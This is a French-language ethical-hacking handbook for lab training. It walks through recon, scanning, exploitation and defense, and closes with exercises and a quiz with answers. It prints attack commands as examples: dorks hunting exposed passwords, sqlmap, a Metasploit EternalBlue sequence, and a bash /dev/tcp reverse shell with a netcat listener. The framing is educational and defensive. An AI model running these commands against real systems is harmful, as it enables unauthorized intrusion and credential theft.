# Livre Pédagogique Hacking Éthique

## Avertissement légal
Ce document est destiné à l'apprentissage défensif et au pentest autorisé.
N'effectuez jamais de test sans autorisation explicite et écrite.

## Vue d'ensemble des phases
[ Phase 1: Reconnaissance ] -> [ Phase 2: Scanning ] -> [ Phase 3: Gain d'Accès ] -> [ Phase 4: Maintien d'Accès ] -> [ Phase 5: Effacement des Traces ]

1. **Reconnaissance** : collecte d'informations.
2. **Scan** : identification des hôtes, ports et services.
3. **Exploitation** : utilisation d'une vulnérabilité.
4. **Post-exploitation** : maintien d'accès et élévation de privilèges.
5. **Covering tracks** : réduction des traces laissées.

# Chapitre 1 : Préparer un labo d'entraînement
Travaillez dans un environnement isolé, par exemple avec VirtualBox ou VMware.

## 1.1 Machines recommandées
- Kali Linux (attaquant)
- Metasploitable / OWASP BWA / DVWA (cibles pédagogiques)

## 1.2 Règles d'or
- Toujours tester sur des systèmes autorisés.
- Documenter les actions et résultats.
- Garder une approche éthique et défensive.

# Chapitre 2 : Méthodologie de pentest
Un pentest suit un enchaînement logique, pas juste des outils exécutés au hasard.

## 2.1 Reconnaissance
Collecte passive (OSINT) puis active (requêtes directes contrôlées).

## 2.2 Scanning et énumération
Découverte réseau, ports ouverts, versions des services et surface d'attaque.

## 2.3 Exploitation
Validation contrôlée des vulnérabilités trouvées.

## 2.4 Post-exploitation
Évaluation de l'impact réel : droits, mouvement latéral, persistance.

## 2.5 Rapport
Le livrable est essentiel : preuves, criticité, recommandations, plan de remédiation.

# Chapitre 3 : Reconnaissance et OSINT
L'OSINT consiste à exploiter des données publiques et légales.

## 3.1 Google Dorking
- `site:entreprise.com filetype:pdf`
- `intitle:"index of" /passwords/`
- `filetype:env DB_PASSWORD`

## 3.2 Informations de domaine
- `whois domaine.com`
- `nslookup domaine.com`
- `dig domaine.com`

## 3.3 TheHarvester
```bash
theHarvester -d entreprise.com -l 500 -b google
```

# Chapitre 4 : Scan et énumération réseau
Une fois la cible identifiée, on cartographie les services exposés.

## 4.1 Nmap
Syntaxe de base :
```bash
nmap <IP_CIBLE>
```

Scan riche en informations :
```bash
nmap -sV -sC -O -p- 192.168.1.50
```

- `-sV` : version des services
- `-sC` : scripts NSE par défaut
- `-O` : détection OS
- `-p-` : tous les ports TCP

## 4.2 Gobuster / Dirb
Recherche de répertoires web cachés :
```bash
gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirb/common.txt
```

# Chapitre 5 : Exploitation et failles courantes
L'objectif est de prouver le risque, pas de dégrader la cible.

## 5.1 SQL Injection (SQLi)
Injection possible quand les entrées utilisateur ne sont pas filtrées.

Exemple de logique dangereuse :
```sql
SELECT * FROM users WHERE username = '' OR '1'='1';
```

Automatisation pédagogique :
```bash
sqlmap -u "http://site.com/item.php?id=5" --dbs
```

## 5.2 XSS (Cross-Site Scripting)
Injection JavaScript côté client permettant vol de session, redirections, etc.

## 5.3 Metasploit
```bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.60
set LHOST 192.168.1.20
exploit
```

# Chapitre 6 : Post-exploitation et élévation de privilèges
Entrer sur une machine n'est souvent que le début.

## 6.1 Shells
- **Bind shell** : la cible écoute
- **Reverse shell** : la cible se connecte à l'attaquant

```bash
# Côté attaquant
nc -lvnp 4444

# Exemple de reverse shell côté cible
bash -i >& /dev/tcp/192.168.1.20/4444 0>&1
```

## 6.2 Privilege Escalation Linux
Recherche de binaires SUID :
```bash
find / -perm -u=s -type f 2>/dev/null
```

Référence utile : GTFOBins.

# Chapitre 7 : Ingénierie sociale
Le facteur humain reste la surface d'attaque la plus exploitable.

## 7.1 Phishing
Usurpation d'identité pour pousser la victime à révéler ses identifiants.

## 7.2 SET (Social Engineering Toolkit)
Permet de simuler des attaques d'ingénierie sociale dans un cadre autorisé.

# Chapitre 8 : Défense (Blue Team)
Chaque technique d'attaque doit avoir une contre-mesure claire.

## 8.1 Tableau attaque -> défense
- Scan Nmap -> Firewall strict + IDS/IPS (Snort/Suricata)
- SQLi -> requêtes préparées + validation d'entrée
- Phishing -> MFA obligatoire + sensibilisation utilisateur
- Exploits connus -> patch management régulier
- Mots de passe faibles -> politique forte + gestionnaire de mots de passe

## 8.2 Outils défensifs à connaître
- SIEM (corrélation de logs)
- EDR/XDR
- Scanner de vulnérabilités
- Sauvegardes testées et plan de reprise

# Annexe : Boîte à outils pentest
- Nmap
- Wireshark
- Burp Suite
- Hydra
- Hashcat / John the Ripper

# Conclusion
Le hacking éthique vise à réduire le risque réel.
La technique compte, mais la rigueur, la légalité et l'éthique sont non négociables.

# Atelier pratique Pentest éthique

## Exercices pratiques
1. Monte un labo local (Kali + cible vulnérable volontaire) sur réseau privé.
2. Réalise une phase OSINT minimale (domaine, DNS, footprint public).
3. Exécute un scan Nmap documenté et classe les services par criticité.
4. Teste un scénario web simple (ex: SQLi/XSS en environnement d'entraînement).
5. Rédige un mini-rapport : preuves, risque métier, remédiation.

## Checklist mission (red/blue team)
- Autorisation écrite validée.
- Périmètre et fenêtres de test définis.
- Plan de rollback en cas d'incident.
- Journalisation des commandes et résultats.
- Classification CVSS / criticité.
- Recommandations actionnables (court, moyen, long terme).

## Mini-quiz
1. Différence entre reconnaissance passive et active ?
2. Pourquoi `-sV` est critique dans Nmap ?
3. Quelle contre-mesure principale contre le phishing ?
4. Pourquoi les requêtes préparées bloquent la SQLi ?
5. Quel est le but réel d'un pentest éthique ?

## Corrigé rapide
1. Passive: sans interaction directe risquée; active: requêtes vers la cible.
2. `-sV` identifie versions de services et donc vulnérabilités connues.
3. MFA + sensibilisation + filtrage mail.
4. Elles séparent données utilisateur et requête SQL.
5. Réduire le risque réel via preuve technique + plan de correction.
